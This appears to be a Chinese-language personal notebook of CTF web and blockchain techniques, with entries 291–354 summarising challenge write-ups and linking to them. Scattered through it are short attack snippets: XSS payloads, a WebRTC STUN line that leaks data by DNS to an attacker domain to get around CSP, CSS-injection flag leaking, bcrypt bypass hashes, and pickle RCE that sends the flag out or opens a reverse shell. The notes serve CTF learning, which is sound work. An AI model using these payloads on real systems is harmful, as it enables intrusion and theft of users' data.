- js的history.replaceState函数可以更改一个页面显示的url，但不会影响真正所在的url。比如当前在`a/b`，可改成`a/c`。这样显示的是`a/c`，但实际在`a/b`。只能同源页面下使用，a.com不能改成b.com
- flask路由返回的任何字符串都会被看作是html渲染
- 可以在打开新页面的同时修改其内容
```js
var my = window.open('/x' + e, '_blank' ,"height=600, width=600");
my.onload = function () {
 my.document.body.innerHTML = "winner!!";
};
```
但是仅限打开的页面与当前页面同源

291. [petpet rcbee](https://drt.sh/posts/htb-petpet-rcbee/)
- [Python PIL/Pillow Remote Shell Command Execution via Ghostscript](https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509)。将一段ghostscript作为图片文件提供给pil，当调用Image.Open时，pil监测到这是个EPS图片，然后利用漏洞在ghostscript里写要执行的命令
292. [Cybergon's Blog](https://learn-cyber.net/writeup/Cybergon's-Blog)
- php session文件包含rce。php session文件通常在默认目录下，且文件的内容用户一般可控制（如记录了username）。如果有文件包含漏洞，将代码放进session文件里再包含即可触发rce
- 有时候session可能不在默认目录下。这种情况尝试`/proc/self/fd/[num]`，有概率访问到session文件
293. [Re-Remix](https://github.com/minaminao/ctf-blockchain/tree/main/src/ProjectSekaiCTF2023)
- solidity [Read-only reentrancy](https://medium.com/@zokyo.io/read-only-reentrancy-attacks-understanding-the-threat-to-your-smart-contracts-99444c0a7334)攻击。算reentrancy下的一个小分支，利用错误的逻辑导致程序读取一些重要的值时出错。这种攻击一般都出现在不遵守[Checks, Effects, Interactions](https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-11-coding-patterns/topic/checks-effects-interactions/)的代码中。Checks, Effects, Interactions指的是代码需要先检查，再更改状态，最后与用户交互。一个例子就是取钱逻辑，首先要判断用户是否有那么多的钱，然后在帐户上扣除相应的钱，最后再调用用户的诸如`payable(msg.sender).call`函数。如果反过来，检查后先与用户交互，再扣除钱，那么用户可以在call函数内再来一次取钱。因为状态未更新，凭空就多出来了双倍的钱
- 简述一下这道题的Read-only reentrancy。在getGlobalInfo函数中，d和_totalVolumeGain的值正常情况下是一样的，`(d * 10 ** DECIMALS) / _totalVolumeGain`最终结果是`10 ** DECIMALS`，1后面跟着很多0。我们的目标是让这个结果包含更多数字（不只是1和0）。increaseVolume和decreaseVolume可以修改_totalVolumeGain，但是正常调用的话d的值也会改，效果就是_totalVolumeGain继续等于d。关键点在于decreaseVolume中有句`payable(msg.sender).sendValue(amount);`,此时其中一个值改了但另一个值没改（就是上面提到的Effects, Interactions反了）。那么就能在攻击合约的`receive()`函数中调用finish间接调用getGlobalInfo，利用d和_totalVolumeGain值不一样的时机完成攻击
- 这题的代码似乎从 https://chainsecurity.com/curve-lp-oracle-manipulation-post-mortem/ 更改而来
294. [Play for Free](https://mcfx.us/posts/2023-09-01-sekaictf-2023-writeup/#blockchain-play-for-free)
- Solang contract blockchain题目。目标是读取合约的private storage并与其交互。a Solang contract saves data in another data account/search value in dispatch table
295. [Scanner Service](https://learn-cyber.net/writeup/Scanner-Service)
- ruby的`to_i`函数将字符串转为数字，但是只要字符串以数字开头即可。如`"123abc".to_i`结果为123，不会报错
- nmap参数注入。如果没法注入新的命令，单纯靠nmap的参数也可以rce。参考 https://gtfobins.github.io/gtfobins/nmap/ 和wp（需要公网ip,如果用ngrok转发的话注意过滤，需要把域名转成ip： https://siunam321.github.io/ctf/SekaiCTF-2023/Web/Scanner-Service/ ）
- shell命令参数除了用`${IFS}`和空格隔开，还能用tab键
296. [Golf Jail](https://blog.antoniusblock.net/posts/golfjail/)
- iframe的srcdoc里的内容光用php的`htmlspecialchars`是不够的，因为srcdoc里的代码本身就能适配HTML entities。iframe里的csp遵循其parent的csp
- 构造较短的js xss payload。参考 https://www.offensiveweb.com/docs/writeup/sekaictf2023_golfjail/ ，一般有3种做法：
```html
<!-- <svg/onload=xxx 也可以 -->
<svg onload=eval(location)> <!-- about:srcdoc（如果在iframe里，这个不能用）-->
<svg onload=eval(top.location)> <!-- http://urlOfThePage/... -->
<svg onload=eval(baseURI)> <!-- http://urlOfThePage/... -->
<svg onload=eval(location.hash)> <!-- 获取http://urlOfThePage/#content 中的#content部分。另外在iframe中这个值为空 -->
```
关于iframe里的payload再补充几句：
```js
//WORKING
document.write("<iframe srcdoc='<script>alert(top.location)</script>'></iframe>")
//NOT WORKING (Blocked by sandbox attribute)
document.write("<iframe sandbox='allow-scripts' srcdoc='<script>alert(top.location)</script>'></iframe>")
//Depends on Cross-Origin-Opener-Policy, 如果设置为same-origin就不能用
document.write("<iframe sandbox='allow-scripts' srcdoc='<script>console.log(top.opener)</script>'></iframe>")
```
单纯eval baseURI会报错，可以参考wp里的闭合做法来执行有效payload
- DNS exfiltration with WebRTC。当csp比较严（但是仍然可以执行代码，如`default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval'`）时，可以利用WebRTC来访问外部资源，绕过CSP
```js
pc = new RTCPeerConnection({"iceServers":[{"urls":["stun:"+ "data_want_to_exfiltrate"+"."+"mydomain.com"]}]});pc.createOffer({offerToReceiveAudio:1}).then(o=>pc.setLocalDescription(o));
//mydomain.com 可以从 https://app.interactsh.com/#/ 拿一个免费的，用于detect out-of-band DNS interactions
```
wp里还有将要泄露的内容转换为符合域名规范的16进制的进阶payload。注意转为16进制内容可能会很长，而域名的每个label最长63个字符，超过后请求失败。所以需要手动发送多次payload，每次更改截取的索引。
- 如果是借助get传payload，尽量将paylaod base64encdoe。不然浏览器会自动编码特殊字符
- [tiny xss payloads](https://tinyxss.terjanq.me/)
297. [Chunky](https://fireshellsecurity.team/sekaictf-frog-waf-and-chunky/#challenge-chunky-16-solves)
- 请求走私（[Request Smugling](https://portswigger.net/web-security/request-smuggling)）。也可以参考 https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn 。简单来说，就是一个服务由多个服务器组成，前端和后端。这些服务器对Content-Length和Transfer-Encoding的处理不一致，导致前端认为是一个request，传给后端就变成了两个。能利用这个走私进去的request进行特殊的攻击
- [Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)。有请求走私的情况下可以考虑这个攻击（当然前提是这个服务有cache server）。Cache Poisoning指的是，以某种方法让请求A时服务器返回的内容为有害payload，然后让cache server记住这个内容，以后任何用户访问A时拿到的都是payload。结合请求走私，我们在请求A的后面走私一个请求B，后端服务器会返回A和B的response，但是前端服务器认为自己只请求了A，只读取了A的response。接下来请求C时，B就被返回了，造成请求C获取到的却是B。如果能让server cache这个结果，以后任何人访问C得到的都是B了
- [JWKS Spoofing](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#jwks-spoofing)：有些网站验证JWT token时会请求某个url A获取public key，然后验签。利用cache poisoning，将url A投毒为攻击者自己的公钥即可伪造jwt
298. [The Bidding](https://lkmidas.github.io/posts/20230828-sekaictf2023-writeups)
- Anchor Framework solana（rust） blockchain题目。这题在比赛时被归为pwn，但是我习惯把blockchain相关的放在web
299. [Leakless Note](https://gist.github.com/eskildsen/ec9cecbf2ae567b24f468cea077ddce5)
- 根据[官方文档](http://nginx.org/en/docs/http/ngx_http_headers_module.html)，当nginx配置中add_header处的CSP没有设置always，那么CSP不会被应用于404页面
- 浏览器会限制同时访问一个origin的requests的数量，Chromium中默认是6个平行请求。剩余的会加入队列中
300. [Smooth Jazz](https://www.justinsteven.com/posts/2023/09/10/ductf-2023-smooth-jazz-sqli/)
- 在php中，使用mysql查询会截断ascii值大于等于0x80的字符以及其后面的所有字符
- php vsprintf函数使用
    - 和C的格式化字符串一样，也能用`$1%s`显式获取printf参数。
    ```php
    print_r(vsprintf("%c", array("1337BEEF")));
    //9
    //1337BEEF后的BEEF被截断，只剩下1337.%c将其强制转换为字符，结果为chr(1337 % 256)='9'
    ```
    - 一个比较特殊的技巧。`%1$'>%`本身不是一个格式：
    ```php
    print_r(vsprintf('%1$\'>% %s', ["Hello, world!"]));
    //% Hello, world!
    ```
    但是在`htmlspecialchars($content,ENT_COMPAT | ENT_SUBSTITUTE);`后变为`%1$'&gt;%s`，结果却包含了一个%s：
    ```
    [+] %1$'&g
    %  - start of format string conversion specification
    1$ - argnum    - take from the first item in the values array
    '& - flags     - use the & character as a padding character
    g  - specifier - general format
    [+] t;
    Plain old data
    [+] %s
    A humble %s format string conversion specification
    ```
301. [CGI Fridays](https://learn-cyber.net/writeup/CGI-Fridays)
- perl中`@_`表示传入subroutine(跟函数类似，但是不返回值)的参数所组成的数组
- perl cgi的`CGI::Minimal->param("paramname")`获取网页名为paramname的query（如get传参）的值。当这个值有多个，如`?param=a&param=b`时，会返回全部值所组成的数组
- subroutine不支持传数组作为参数，如果硬要传结果是把数组拆开作为不同的参数。`func(array_size2)`等同于`func(array[0],array[1])`
302. [Breaking Grad](https://d4rkstat1c.medium.com/breaking-grad-hackthebox-write-up-9e780ff2b68b)
- js原型链污染。递归merge（clone）时，除了直接用键名`__proto__`污染，也可以间接使用`constructor`：`{'constructor':{'prototype':{'target_property':'value'}}`
- 原型链污染可以污染`child_process.fork`的options。可以污染NODE_OPTIONS让其读取environ文件，然后污染env为要执行的node js脚本。或者参考 https://y3a.github.io/2021/06/15/htb-breaking-grad/ ，污染execPath和execArgv
303. [Static File Server](https://xhacka.github.io/posts/writeup/2023/09/03/static-file-server/)
- 有时候浏览器会标准化url，让路径穿越的payload`../`无法使用。此时可以用curl加上`--path-as-is`选项访问
- Python的aiohttp asynchronous HTTP Client/Server中`web.static('/files', './files', follow_symlinks=True)`无法防止/files处的路径穿越
304. [Eight Five Four Five](https://www.youtube.com/watch?v=1FxjP_hwqec)
- 使用python web3与solidity blockchain进行基础交互：连接，调用函数。题目一般会给出以下值：
    - player wallet address
    - private key
    - contract address:题目合约所在的地址
    - rpc url
    - abi：也可以从题目给出的源码那里自行编译获取
    - initial gas price
```py
from web3 import Web3
web3=Web3(Web3.HTTPProvider(rpc_url))
contract=web3.eth.contract(address=contract_address,abi=abi)
#contract.functions为全部可调用的函数
contract.functions.function_name().call() #调用名为function_name的函数。注意这种调用方式只能调用那些仅从blockchain读取数据的函数（例如单纯return某个值），无法调用会改变合约状态的函数（例如函数内部会给一个属性赋值）。调用这类函数参考下面：
#有些POA chain在build之前需要middleware，否则会引发ExtraDataLengthError
from web3.middleware import geth_poa_middleware
web3.middleware_onion.inject(geth_poa_middleware,layer=0)
#get nonce
nonce=web3.eth.get_transaction_count(caller)
#build transaction
trx=contract.functions.function_name().build_transaction({'from':player_wallet_address,'nonce':nonce,'gasPrice':initial_gas_price})
#用私钥签名transaction
strx=web3.eth.account.sign_transaction(trx,private_key=private_key)
hstrx=web3.eth.send_raw_transaction(strx.rawTransaction)
#当status为1时表示处理成功
res=web3.eth.wait_for_transaction_receipt(hstrx)
```
- 文字版的wp： https://justinapplegate.me/2023/ductf-8545/ ，连接的方法是一样的，不过多了个怎么用remix找合约的abi
- remix解法： https://bsempir0x65.github.io/CTF_Writeups/DownUnderCTF_2023
- cast命令解法： https://github.com/DownUnderCTF/Challenges_2023_Public/tree/main/blockchain/eightfivefourfive/solve
305. [strapi in](https://github.com/DownUnderCTF/Challenges_2023_Public/tree/main/web/strapi-in)
- [strapi-plugin-email-designer](https://github.com/alexzaganelli/strapi-plugin-email-designer) ssti
306. [0day blog](https://github.com/DownUnderCTF/Challenges_2023_Public/tree/main/web/0day-blog)
- Drupal core `JSON:API` module cache poisoning。可通过构造恶意url，使admin访问这个url后session cookie会被cache进这个url，以后任意一个普通用户访问这个url就能获取admin的session cookie
307. Mongo ObjectId是可预测的，利用工具： https://github.com/andresriancho/mongo-objectid-predict
308. [Smug-Dino](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/web/smug-dino),[wp](https://github.com/D13David/ctf-writeups/tree/main/csaw23/web/smug_dino)
- nginx 1.17.6请求走私
309. [rainbow-notes](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/web/rainbow-notes)
- 利用dom clobbering使`node.parentElement.removeChild()`报错
- 利用[STTF fragments](https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/)和CSS的`:target` selector泄露页面上的内容。参考 https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection#styling-scroll-to-text-fragment 。此题的其他参考解法：
    - `<form id="f"><input name="insertBefore">X<style>:target{background:url("")}</style></form>#:~:text=flag{`
    - https://github.com/SuperStormer/writeups/tree/master/csawctf_2023/web/rainbow-notes
310. [SculptAI](https://blog.aravindha.in/winja-ctf-nullcon-goa-2023/)
- websocket下的sqlite注入。漏洞点和利用方法都一样，只不过连接方式不同。sqlmap默认不支持websocket，需要借助于工具： https://github.com/BKreisel/sqlmap-websocket-proxy
311. [reCAPTCHA v39](https://github.com/sahuang/my-ctf-challenges/tree/main/vsctf-2023/misc_recaptcha-v39)
- python建立websocket连接+计算图片阴影部分面积。websocket连接的网页用requests是连不上的
312. [ZKPLite](https://github.com/sahuang/my-ctf-challenges/tree/main/vsctf-2023/misc_zkplite)
- blockchain如何计算/预测合约地址（msg.sender）： https://docs.soliditylang.org/en/latest/control-structures.html#salted-contract-creations-create2
313. [Optimized Admin Bot](https://www.youtube.com/watch?v=BRnMRdQJVeo)
- JSDOM在服务器的node context下执行代码，所以获取xss时可以利用spawn等函数直接RCE。当`runScripts`设置为`dangerously`时，有一个小小的沙盒用于执行代码，可以参考wp的做法逃逸： https://gist.github.com/c0nrad/b919aa1c659a4d0f9596f5c6e1aad47f
- [其他做法](https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#optimized-admin-bot)包含技巧：
    - 使用node addon
    - 利用XMLHttpRequest从原型链污染到RCE： https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce
    - https://github.com/jsdom/jsdom/issues/2729 (wouldnt work by itself cause require doesnt exist in es6 modules)
314. [Dependency Confusion](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
- 部分项目会使用内部编写的库，但当黑客利用各种方式获取到内部库的名字后，可以提前在各种库管理工具注册同名的公共库。某些工具在库名重复时优先选择版本高的，所以黑客将自己的库版本提高然后往里面放有害代码即可完成RCE
    - 有漏洞风险的工具包括python的pip，nodejs的npm，ruby的gems和[Haskell](https://frasertweedale.github.io/blog-fp/posts/2021-02-12-haskell-dependency-confusion.html)
315. [Dictionary](https://github.com/C4T-BuT-S4D/bricsctf-2023-stage1/tree/master/tasks/ppc/dictionary)
- GenjiDB sql时间布尔盲注。不过genjidb没有substr等函数，建议用binary search猜测字符串长度及内容
316. [ChadGPT](https://github.com/C4T-BuT-S4D/bricsctf-2023-stage1/tree/master/tasks/web/chadgpt)
- [GoJay](https://github.com/francoispqt/gojay)与标准`encoding/json`库的解析差异。GoJay解析全部的json字段后，允许在最后加上任意内容（包括注释），但是标准库则会报错
317. [My Secrets](https://github.com/C4T-BuT-S4D/bricsctf-2023-stage1/tree/master/tasks/web/my-secrets)
- js express links漏洞。links函数用于给response添加[Link header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Link)，Link header本身又等于[<link>](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/link)的作用。当用户可以控制传入links的参数时，可以用`>`号闭合当前内容，并添加自己的preload url。可利用这点促使服务器访问自己的webhook
318. [picoblog](https://github.com/C4T-BuT-S4D/bricsctf-2023-stage1/tree/master/tasks/web/picoblog)
- [rust-rpxy](https://github.com/junkurihara/rust-rpxy)漏洞：
    - 错误的host header实现
    - 缓存功能存在条件竞争。可以同时准备多个request但缺少最后一个字节，然后同时发出最后一个字节
- 若CSP不允许`unsafe-inline`且X-Frame-Options header和CSP frame-ancestors选项都启用，仍然可以利用`<iframe>`+srcdoc绕过
319. [Ohio Instruments 84](https://github.com/4n86rakam1/writeup/tree/main/BuckeyeCTF-2023/web/Ohio_Instruments_84)
- octave --eval命令注入。若攻击者可控制--eval后的参数，可实现getshell等功能。这里列举出读文件的做法（过滤单双引号，分号。但分号可用`\n`代替），要求程序会渲染图表（所以部分解法会把文件内容读到图表名里）: https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#ohio-instruments-84
    - https://github.com/luketrenaman/bctf-2023/tree/main/ohio-instruments-84
320. [Text Adventure API](https://github.com/4n86rakam1/writeup/tree/main/BuckeyeCTF-2023/web/Text_Adventure_API)
- pickle反序列化执行系统命令。wp的做法使用`python3 -c`创建HTTPConnection然后read flag，将flag带到自己的服务器上。似乎平时用的[webhook](https://webhook.site)没法连接，但是 https://app.interactsh.com 可以
- https://github.com/goku007xx/CTF-Writeups/tree/main/2023/BuckeyeCTF-2023/test-adventure-api 提供了反弹shell做法（使用ngrok）
321. [area51](https://github.com/4n86rakam1/writeup/tree/main/BuckeyeCTF-2023/web/area51)
- mongodb(nodejs里有个库叫Mongoose,两者的区别参考 https://stackoverflow.com/questions/28712248/difference-between-mongodb-and-mongoose ) nosql注入。以前知道拼接会产生注入，没想到这种代码也会：
```js
//token为用户控制内容
return User.find({
			session: token
		}).then(...)
```
注入方式为利用题目没有检查输入类型的特点，让token为`{"token":{"$regex":"flag.*"}}`，其中session是要获取的值。每次爆破session的一个字符，有回显就继续爆破session的下个字符。也可以参考 https://github.com/goku007xx/CTF-Writeups/tree/main/2023/BuckeyeCTF-2023/area51 使用`^`作为正则
- 更多nosql注入参考 https://book.hacktricks.xyz/pentesting-web/nosql-injection
322. [infinity](https://github.com/4n86rakam1/writeup/tree/main/BuckeyeCTF-2023/web/infinity)
- python socketio库（js socket.io）使用。这个库和普通的socket有些不同
- js做法： https://voxal.dev/blog/inf!
333. [new-management](https://www.youtube.com/watch?v=I-zBSHp9qOc)
- 如何利用remix+metamask与sepolia testnet上的合约进行交互。有意思的地方在于，在这种testnet上可以看到其他人的操作（调用了什么函数，按照时间顺序排序），意味着可以借鉴其他人的做法
334. [certs](https://www.youtube.com/watch?v=I-zBSHp9qOc)
- js jose库[jwtVerify](https://github.com/panva/jose/blob/main/docs/functions/jwt_verify.jwtVerify.md)的错误使用。下面这段代码的try和catch段分别为非对称验证的对称验证的案例：
```js
try {
        const result = await jose.jwtVerify(
        token,
        await jose.importSPKI(publicKey, "RS256") //非对称，签名时用私钥，验证时用公钥
    );
    return result.payload as any;
} catch (e) {
    try {
        const result = await jose.jwtVerify(
        token,
        new TextEncoder().encode(publicKey) //对称，签名时用一个密钥，验证时也用同样的密钥
    );
    return result.payload as any;
    } catch (e) {}
}
```
这个同样也是错误示范。如果源码给出公钥，攻击者就能用公钥签名jwt后走catch分支验证
- 假如服务器没有给公钥，这个[工具](https://github.com/silentsignal/rsa_sign2n)可以从两个签名的token里提取出公钥。不过其结果在末尾会有个换行符，视情况删除。参考Crypto笔记的119条
335. [font-review](https://github.com/cscosu/buckeyectf-2023-public/tree/master/web-font-review),[wp](https://github.com/Nambers/ctf-writeups/tree/main/buckeyeCTF-2023/web-font_review-hard)
- [css injection](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection#text-node-exfiltration-i-ligatures-1)。这类题目只允许输入css，要求用某种方法泄露bot所在页面上的flag。此题利用自定义字体（font）[ligatures](https://fonts.google.com/knowledge/glossary/ligature)猜测flag。当页面中的字符溢出时，会报错；反之不会。那么利用某个css匹配flag，若flag匹配则让字体变大导致溢出；反之不会。进而一个字符一个字符猜出完整的flag
- hacktricks里的技巧使用svg font，不过现代浏览器已经不支持了，因此需要使用[fontforge](https://github.com/fontforge/fontforge/tree/master)将svg font转为woff
- 其他做法/参考链接：
    - https://github.com/SuperStormer/writeups/tree/master/buckeyectf_2023/web/font-review
    - https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/
336. [sentiment](https://github.com/cscosu/buckeyectf-2023-public/tree/master/web-sentiment)
- xss+CSRF（with token）without iframes+csp `connect-src 'none'`。具体操作和另一个题目的[wp](https://ctftime.org/writeup/32800)差不多，都是通过操控bot open一个edit tab修改note，note内容为将flag带出的xss payload。发现两者的思路都是将flag使用window.open在另一个窗口打开->edit修改note（flag修改为xss payload，但是打开的那个窗口里还有flag）->访问note，触发xss，将flag窗口里的flag带出。拿出flag常用`document.querySelector`或`querySelectorAll`
- 其他wp： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#sentiment
337. [Web3](https://gist.github.com/YSc21/9be0bb2ce1ed3141e47def6643c19959)
- js ethers库中的[getAddress](https://docs.ethers.org/v5/api/utils/address/#utils-getAddress)可以接受[ICAP格式](https://docs.ethers.org/v5/api/utils/address/#address-icap)的地址。如何获取ICAP地址/签名消息：
```js
const wallet = ethers.Wallet.createRandom();
ethers.getIcapAddress(wallet.address);
signature = await wallet.signMessage(message);
```
338. [0FA](https://github.com/RiuSalvi/CTF_Challenges/tree/main/2023/0FA_balsnctf)
- 伪造[JA3](https://github.com/salesforce/ja3) fingerprint的工具： https://github.com/Danny-Dasilva/CycleTLS 。使用前提是要知道服务器期望的ja3 fingerprint
339. [SaaS](https://github.com/RiuSalvi/CTF_Challenges/tree/main/2023/SaaS_balsnctf)
- [fastify](https://www.npmjs.com/package/fast-json-stringify)模块js SSTI。当程序使用用户提供的schema时，可以在required段注入代码并在登录验证时执行
    - 还可以在`$id`段注入： https://gist.github.com/arkark/32e1a0386360fe5ce7d63e141a74d7b9
340. [1linenginx](https://gist.github.com/arkark/32e1a0386360fe5ce7d63e141a74d7b9)
- nginx/1.16.1 Request Smuggling(请求走私)+xss。其他解法： https://gist.github.com/lebr0nli/dd9c2fef635799865022044817e88956
341. [Ginowa](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2023#ginowa)
- sql注入写webshell。不同做法的知识点：
    - 将webshell写到webroot，然后利用这篇[文章](https://www.n00py.io/2019/06/understanding-unc-paths-smb-and-webdav/)里的知识点对那个文件发送http请求触发webshell。原理是当[unc路径](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths)中带了一个`@`号后会尝试向路径里指定的文件发送HTTP请求，如sql语法下的`load_file('//localhost@8080/a.php')`，就会向a.php发送HTTP请求
    - 直接向`.htaccess`写内容，在每个php文件开头都添上webshell
    - 利用`LOAD_FILE`+windows短名称（shortname）直接运行名字部分已知的文件：`HEX(LOAD_FILE('C:\\readfl~1.exe'))`
    - dump shell命令（hex）到`sc.bat`
    - 将webshell写到PEAR目录下的config.php
342. [Authy](https://pakcyberbot.github.io/CTF-Writeups/posts/BHME-authy/)
- go语言里的unicode编码
```go
user.Name := "😃" // Contains 1 emoji character
lengthOfString := len(user.Name)            // Length of the string (bytes) - 4 (UTF-8 encoding)。直接求unicode字符的长度是4
lengthOfRuneSlice := len([]rune(user.Name)) // Length of rune slice (code points) - 1。转成go里特有的处理unicode的rune后长度就是1
```
343. [Venue](https://chovid99.github.io/posts/tcp1p-ctf-2023/#venue)
- solidity blockchain的EVM里有两种与合约交互的形式：
    - call：A read-only operation that executes a contract function locally without altering the blockchain state. It’s used to query or test functions and doesn’t require gas since it doesn’t create a transaction on the blockchain
    - transaction：A write operation that alters the blockchain state (such as updating variables, transferring ETH, or contract deployment). It requires gas and confirmation by the network, and the changes are permanently recorded on the blockchain

长话短说，call用来调用那些不会改变合约自身状态的函数（只读）；transaction则与之相反。用foundry call函数时不需要private key，而transaction需要

344. [Location](https://chovid99.github.io/posts/tcp1p-ctf-2023/#location)
- solidity blockchain EVM slot。EVM中的每个合约都有persistent storage。每个合约中的字段都会按顺序放到storage slots里，直到当前slot已满（一个slot 32字节）。有些被标记immutable的字段除外，它们不被存储在任何slot里。可以用solc命令查看详细的storage slots信息：`solc test.sol --storage-layout`。也可以用remix查看slot。在remix里编译合约后查看STORAGELAYOUT（跟ABI在一样的地方）即可
345. [VIP](https://chovid99.github.io/posts/tcp1p-ctf-2023/#vip)
- 如何安装MetaMask并获取private key。在执行合约的transaction时必须有自己的wallet和私钥
- foundry 与合约进行交互：call/transaction。foundry使用补充： https://themj0ln1r.github.io/posts/tcp1pctf
346. [Invitation](https://chovid99.github.io/posts/tcp1p-ctf-2023/#invitation)
- EVM内部有function selector，selector是一个以hex格式表示的长度为4个字节的标识符，从函数签名中得来。无法逆向selector，意味着无法在得到selector的情况下的得知该函数的签名；但是可以里用[网站](https://www.4byte.directory/)的数据库查询。可以从合约的bytecode里获取selector，关注下面这段汇编：
```
PUSH4 <selector>
EQ
PUSH <code_dest>
JUMPI
```
347. [Un Secure](https://berliangabriel.github.io/post/tcp1p-ctf-2023/)
- php反序列化漏洞：通过串联多个类获得RCE。这里想提的是php网站里的vendor文件夹和composer.json。可以在composer.json里配置autoload，然后require `vendor/autoload.php`。这样在反序列化/编写文件时会自动包含autoload里提到的类。参考 https://stackoverflow.com/questions/57720711/what-should-i-do-to-using-vendor-folder-located-classes-after-download-via-compo 和 https://getcomposer.org/doc/01-basic-usage.md#autoloading
348. [A Simple Web](https://berliangabriel.github.io/post/tcp1p-ctf-2023/)
- 版本小于等于rc12的[Nuxt.js](https://github.com/nuxt/framework)在dev mode运行时有路径穿越漏洞，参考 https://huntr.com/bounties/4849af83-450c-435e-bc0b-71705f5be440/ 。可用`/_nuxt/@fs/filename`读取任意文件
349. [Latex](https://berliangabriel.github.io/post/tcp1p-ctf-2023/)
- 尝试用latex读取文件，但是需要绕过黑名单。wp的做法利用`\catcode`改变字符的category code。比如\catcode`\@=0,将@字符的作用改成了\，以后需要用\的地方都可以用@代替。额外地，还可以利用这个方法将_改成13。因为flag里通常包含下划线，改成13后不会让latex报错
- 其他做法: https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#latex
350. [love card](https://github.com/4n86rakam1/writeup/blob/main/TCP1PCTF_2023/Web/love_card/index.md)
- php利用[log_errors](https://www.php.net/manual/en/errorfunc.configuration.php#ini.log-errors)和[error_log](https://www.php.net/manual/en/errorfunc.configuration.php#ini.error-log)写内容至任意文件。log_errors为标记是否log error的bool值，error_log为error输出的文件名。可以用ini_set控制这两个值，如：
```php
foreach ($_GET as $key => $value) {
  ini_set($key, $value);
}
```
351. [PDFIFY](https://nightfury99.github.io/TCP1PCTF2023/PDFIFY)
- php [knplabs/knp-snappy phar deserialization vulnerability](https://github.com/KnpLabs/snappy/security/advisories/GHSA-gq6w-q6wh-jggc)。当攻击者可控制Pdf对象的generateFromHtml函数的第二个参数“输出文件”时，可实现rce。首先往服务器上传一个a.phar，然后generateFromHtml("some content",'phar://a.phar')。a.phar反序列化时即可执行内部的代码。因为本质上是反序列化漏洞，内部代码的构造需要在项目里寻找反序列化的gadget。一个便捷的生成工具：[phpggc](https://github.com/ambionics/phpggc)。对于CodeIgniter4，也可以直接去 https://github.com/ambionics/phpggc/blob/master/gadgetchains/CodeIgniter4/RCE/2/gadgets.php 拿gadgets，然后[手动构造phar](https://nightfury99.github.io/notes/Php-Internal/phar-deser#how-to-use-phar-archive-)
- php codeigniter4框架 sql注入。参考 https://www.youtube.com/watch?v=2vAr9K5chII&t=558s ，本质是因为直接将用户的data传进了where/getWhere函数：
```php
$data = $this->request->getPost();
$user = $this->model->where($data)->first();
```
假设data为`param1=a&param2=b`，value处的a和b无法注入，但是参数处的param1和param2可以
- php [Variables From External Sources](https://www.php.net/manual/en/language.variables.external.php)。例如`<input type="text" name="my.name"/>`，值需要通过`$_REQUEST["my_name"]`得到。除了`.`会被改成`_`，还有空格` `和方括号`[`
- php绕过password_verify(bcrypt)。参考 https://bugs.php.net/bug.php?id=81744 和 https://github.com/php/php-src/security/advisories/GHSA-7fj2-8x79-rjf4 ，任何密码都可以用`$2x$08$00000$`或`$2y$10$am$2y$10$am`通过验证
- [wkhtmltopdf SSRF漏洞](https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4875)。任何可以用来加载外部资源的html标签都可以用来触发该漏洞
- curl [URL globbing](https://everything.curl.dev/cmdline/globbing)。可用于绕过过滤，比如请求gopher：`curl {g}opher://localhost:80/_payload`
- 小型python ftp server代码： https://gist.github.com/dkw72n/193cfec6572fb392b671 。允许匿名连接该服务器，无需密码
- 其他做法： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#pdfify
352. [Un Secure](https://github.com/RuiZha0/TCP1PCTF_2023)
- php反序列化时不会记录字段的可访问性。需要手动添加（比如在两端添加`\0`来设置private属性,参考 https://stackoverflow.com/questions/23986032/php-serialize-override-privateprotected-and-stdclass-reflection ），或者使用php的反射API
353. [Calculator](https://github.com/RuiZha0/TCP1PCTF_2023)
- js只使用Math相关函数的构造技巧：
    - 构造数字：`Math.sin.name.length.valueOf()`，利用Math内置函数的名字的长度获取数字
    - 构造字母：`Math.sin.name.length.toString()`。或者直接用构造器：`Math.sin.name.constructor(110)`。这些字符都是数字，字母的字符可以用`Math.sin.name.constructor.fromCharCode(35)`或`Math.sin.name.constructor.fromCharPoint(35)`。这里参数的数字可以参考wp的做法用`Math.floor(Math.log2(Math.exp(num)))`套娃构造
    - js里给没有参数函数传参不会报错，无论怎么传也不会影响函数的结果
    - js里重写的函数name属性是空。具体如下：
    ```js
    Math.random.name.toLowerCase()
    'random'
    Math.random=function(){}
    Math.random.name.toLowerCase()
    ''
    ```
    - deno环境读取文件的捷径：`return Deno.readTextFileSync('flag.txt')`，稍微复杂一点是`return (new TextDecoder("utf-8")).decode(Deno.readFileSync("flag.txt"))`
- 其他做法： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#calculator
- 类似题目：
    - https://sekai.team/blog/intigriti-0823/writeup/
    - https://blog.huli.tw/2023/08/29/intigriti-0823-author-writeup/
    - https://gist.github.com/egonny/4dbf5151f99059ae58cf9390c7cc3830
354. [fetcher](https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/tree/main/Web/fetcher)
